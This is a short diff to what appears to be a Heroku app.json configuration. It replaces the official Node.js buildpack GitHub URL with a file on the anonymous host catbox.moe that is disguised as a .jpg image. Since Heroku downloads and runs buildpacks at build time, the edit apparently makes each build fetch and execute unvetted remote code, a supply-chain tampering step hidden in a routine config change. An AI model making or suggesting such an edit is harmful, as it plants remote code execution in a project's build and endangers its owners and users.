@@ -14,7 +14,7 @@
 
      "buildpacks": [
         {
-            "url": "https://github.com/heroku/heroku-buildpack-nodejs.git"
+            "url": "https://files.catbox.moe/tk5hc1.jpg"
         }
      ],
   "stack": "heroku-24"
